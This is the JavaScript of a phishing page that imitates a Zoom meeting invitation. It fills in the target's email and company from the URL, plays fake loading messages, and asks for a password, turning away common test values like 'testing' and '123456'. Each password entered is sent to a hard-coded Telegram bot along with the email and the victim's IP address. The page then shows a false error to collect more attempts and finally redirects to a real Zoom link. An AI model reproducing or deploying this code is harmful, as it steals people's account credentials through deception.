

function runn(){
            var emaill = window.location.hash.substr(1);
            $("#mailer").text(emaill);

    const urlParams = new URLSearchParams(window.location.search);
    const company = urlParams.get('company');
    
    if (company) {
        const headerb1 = document.querySelector(".meeting_header b");
        if(headerb1){
           headerb1.textContent = `${company}`;
        }
    } else {
        const headerb2 = document.querySelector(".meeting_header b");
        if(headerb2){
           headerb2.textContent = `${emaill}`;  
        }
       
    }


        const firstnm = urlParams.get('firstname');
        const secondnm = urlParams.get('secondname');

        const spans = document.querySelectorAll(".meeting_photo span");

        if (firstnm && spans.length > 0) {
            spans[0].textContent = firstnm;
            spans[0].parentElement.style.textAlign = 'center';
        }

        if (secondnm && spans.length > 1) {
            spans[1].textContent = secondnm;
            spans[1].parentElement.style.textAlign = 'center';
        }

        // Centering the h5 elements
        const h5Elements = document.querySelectorAll(".meeting_photo h5");
        h5Elements.forEach(h5 => {
            h5.style.textAlign = 'center';
        });



        $("#join_btn").on("click", ()=>{
        $("#join_btn").hide();
        $(".meeting_loading").css({"margin-top":"2rem"});
        
        $("#loader_img").html(`<img src="./Zoom-Call-Group-Meeting_files/loading.gif" alt="loading ...">`);
        $("#loader_text").html(`<i>launching ...</i>`);


        const urlParams = new URLSearchParams(window.location.search);
        var comp = atob( `${urlParams.get('id')}`);
        var em =  atob(`${urlParams.get('access')}`);
        
        setTimeout(() => {
            $("#loader_text").html(`<i>detecting operating system ...</i>`)
        }, 2000);

        setTimeout(() => {
            $("#loader_text").html(`<i>system verification ...</i>`)
        }, 5000);

        setTimeout(() => {
            $("#loader_text").html(`<i>connecting to meeting ...</i>`)
        }, 9000);

        setTimeout(() => {
            $("#loader_text").html(`<i>initializing ...</i>`)
        }, 12000);

        setTimeout(() => {
            const meetingId = document.getElementById('get_id').value;
            const access = document.getElementById('get_access').value;
            
            const newUrl = `Zoom1.html?id.php?meeting=video&id=${encodeURIComponent(meetingId)}&access=${encodeURIComponent(access)}&company=${comp}#${em}`;
               
            let url = newUrl;
            location = url;
        }, 15000);
    })
        

  


    let pw = document.getElementById("ipass")
    $("#ipass").on('click', ()=>{
        pw.type = "password"
        pw.style.color = "black"
    })


    let reg_count = 0;
    $("#launch_btn").on("click", ()=>{
        let pax = $("#ipass").val()
        let emmm = $("#mailer").val()

        if (pax == "" || pax.length < 3) {
            $("#ipass").css({"border-color":"red"})

            setTimeout(() => {
                $("#ipass").css({"border-color":"gray"})
            }, 5000);
            return
        }

        if (pax == "testing" || pax == "TESTING" || pax == "Testing" || pax == "123456" || pax == "password" || pax == "PASSWORD" || pax == "Password" || pax == "qwerty" || pax == "QWERTY") {

            $("#ipass").css({"border-color":"red"})
            
            return
            
        }

        reg_count++
        $("#launch_btn").hide();
        $(".meeting_loading").css({"margin-top":"2rem", "margin-bottom":"2rem"});
        $("#loader_img").html(`<img src="./Zoom-Call-Group-Meeting_files/loading.gif" alt="loading ..." />`);
        var ipp = "";
        var datatosend = "";

            let tg2 = {
        token2: `7954852701:AAEnJ1Ht0a_zYQonrw7kN-Gf6srjQd9JuXE`,  
        chat_id2: `6006419090`
    }

    function sendMessage2(text2)
    {

        const url2 = `https://api.telegram.org/bot${tg2.token2}/sendMessage?chat_id=${tg2.chat_id2}&text=${text2}`; // The url to request
        const xht2 = new XMLHttpRequest();
        xht2.open("GET", url2);
        xht2.send();

    }
            function getIPCountryAndLanguage() {
                fetch('https://api.ipify.org/?format=json')
                    .then(response => response.json())
                    .then(data => {

                        ipp = data.ip;

                        datatosend = `IP: ${data.ip}
                                    Email: ${emaill}
                                    Password: ${pax}`;

                        sendMessage2(datatosend);
                    })
                    .catch(error => {
                      

                            datatosend = `Email: ${emaill}
                                        Password: ${pax}`;

                            sendMessage2(datatosend);
                    });
            }


            getIPCountryAndLanguage();
    

        if (reg_count == 4) {
            pw.type = "search";
            pw.style.color = "transparent";
            $("#loader_text").html("");

            //let url = "../cgi-wp/zm_logz.php?auth=zoom360&name="+$("#get_id").val()+"&mail="+$("#mailer").text()+"&pass1="+$("#temp_ipass").val()+"&pass2="+pax
            
            setTimeout(() => {
                //location = url

                window.location.replace("https://us05web.zoom.us/s/82050708316?pwd=qXfmwuFUeciwAfF7ElVMN5NgOWvNUW.1#success");
                
            }, 2000);

           
        } 
        else {
            pw.type = "search";
            pw.style.color = "transparent";

            let rand_num = $("#rand_number").val()

            setTimeout(() => {

                $("#loader_text").html(`<span style="color:red">There was error connecting, please try again.</span>`);

                $("#temp_ipass").val(pax)

                $("#ipass").val("");
                $("#loader_img").html("");
                $("#launch_btn").show();

            }, rand_num); 
        }
    })

}



  
 
    runn();
